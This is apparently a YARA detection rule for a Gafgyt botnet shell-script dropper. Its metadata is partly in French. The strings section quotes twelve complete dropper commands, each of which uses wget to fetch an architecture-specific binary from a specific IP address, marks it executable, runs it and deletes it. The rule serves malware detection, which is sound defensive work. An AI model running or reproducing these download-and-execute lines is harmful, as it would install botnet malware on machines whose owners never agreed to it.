rule SCRIPT_Dropper_Gafgyt_ForgeAuto_4c9fbc49
{
    meta:
        author = "Marjoriefort"
        description = "Detects Gafgyt (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "4c9fbc49a110945822d0417d93159ff42700db00783697b500174b7d3fb9a8e3"
        yarahub_uuid = "ea888c86-848d-42c1-91f0-28bac67cb08c"
        famille = "Gafgyt"
        famille_source = "reputation"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "43b62cb5a0ef04c4b4a4693680ca1de0"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "/bin/bash" ascii
        $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/m-i.p-s.SNOOPY; chmod +x m-i.p-s.SNOOPY; ./m-i.p-s.SNOOPY; rm -rf m-i.p-s.SNOOPY" ascii
        $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/m-p.s-l.SNOOPY; chmod +x m-p.s-l.SNOOPY; ./m-p.s-l.SNOOPY; rm -rf m-p.s-l.SNOOPY" ascii
        $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/s-h.4-.SNOOPY; chmod +x s-h.4-.SNOOPY; ./s-h.4-.SNOOPY; rm -rf s-h.4-.SNOOPY" ascii
        $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/x-8.6-.SNOOPY; chmod +x x-8.6-.SNOOPY; ./x-8.6-.SNOOPY; rm -rf x-8.6-.SNOOPY" ascii
        $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/a-r.m-6.SNOOPY; chmod +x a-r.m-6.SNOOPY; ./a-r.m-6.SNOOPY; rm -rf a-r.m-6.SNOOPY" ascii
        $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/x-3.2-.SNOOPY; chmod +x x-3.2-.SNOOPY; ./x-3.2-.SNOOPY; rm -rf x-3.2-.SNOOPY" ascii
        $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/a-r.m-7.SNOOPY; chmod +x a-r.m-7.SNOOPY; ./a-r.m-7.SNOOPY; rm -rf a-r.m-7.SNOOPY" ascii
        $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/p-p.c-.SNOOPY; chmod +x p-p.c-.SNOOPY; ./p-p.c-.SNOOPY; rm -rf p-p.c-.SNOOPY" ascii
        $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/i-5.8-6.SNOOPY; chmod +x i-5.8-6.SNOOPY; ./i-5.8-6.SNOOPY; rm -rf i-5.8-6.SNOOPY" ascii
        $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/m-6.8-k.SNOOPY; chmod +x m-6.8-k.SNOOPY; ./m-6.8-k.SNOOPY; rm -rf m-6.8-k.SNOOPY" ascii
        $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/a-r.m-4.SNOOPY; chmod +x a-r.m-4.SNOOPY; ./a-r.m-4.SNOOPY; rm -rf a-r.m-4.SNOOPY" ascii
        $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.151/a-r.m-5.SNOOPY; chmod +x a-r.m-5.SNOOPY; ./a-r.m-5.SNOOPY; rm -rf a-r.m-5.SNOOPY" ascii
    condition:
        true and filesize < 50MB and 2 of them and 1 of ($s0, $s1, $s2, $s3, $s4)
}
